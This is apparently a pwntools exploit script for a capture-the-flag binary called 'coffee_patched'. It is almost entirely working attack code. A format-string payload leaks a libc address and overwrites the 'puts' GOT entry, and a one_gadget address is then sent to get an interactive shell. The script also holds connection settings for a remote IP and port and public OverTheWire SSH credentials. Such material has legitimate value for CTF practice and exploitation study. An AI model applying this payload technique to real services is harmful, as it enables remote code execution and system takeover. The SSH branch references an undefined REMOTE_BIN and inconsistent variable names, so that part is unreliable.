from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = True

LOCAL_BIN = './coffee_patched'
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('34.146.101.4',30002) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *0x004011eb')



##########################
##### OFFSET FINDER ######
##########################
#context.arch='amd64'
one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]
x_2 = 0x4012
x_1 = 0x86
print_to_return = 0x404018
payload = f'%29$p.%{x_1-15}c%13$n%{x_2-x_1}c%14$hn%{print_to_return-x_2-13}c'.encode().ljust(48,b'a')\
          +p64(0x4011bb)+p64(ELF_LOADED.got['puts'])+p64(ELF_LOADED.got['puts']+1)
P.sendline(payload)
LIBC.address = int(P.recvuntil(b'.').strip(b'.'),16) -0x270b3
P.sendline(p64(LIBC.address+one_gadget[0]))

P.interactive()
